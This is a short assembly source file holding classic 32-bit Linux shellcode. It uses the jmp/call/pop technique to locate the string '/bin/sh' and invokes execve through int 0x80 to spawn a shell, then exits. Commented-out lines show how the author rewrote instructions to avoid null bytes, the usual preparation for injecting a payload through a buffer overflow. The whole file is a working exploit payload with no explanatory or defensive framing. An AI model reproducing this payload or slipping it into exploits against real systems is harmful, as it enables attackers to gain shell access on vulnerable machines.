startsc:
	jmp call2

start1:
	popl	%esi
	movl	%esi,	0x8(%esi)

	# movb	$0x0,	0x7(%esi)
	xor	%eax,	%eax
	mov 	%al, 	0x7(%esi)

	# movl	$0x0,	0xc(%esi)
	mov	%eax,	0xc(%esi)	
	mov     $0xb,	%al	

	movl 	%esi,	%ebx
	leal 	0x8(%esi),	%ecx
	leal 	0xc(%esi),	%edx
	int 	$0x80

	# movl 	$0x1,	%eax
	xor	%eax,	%eax
	inc	%eax

 	#movl	$0x0,	%ebx
	xor	%ebx, 	%ebx

  	int	$0x80

call2:
	call start1
	.string "/bin/sh"
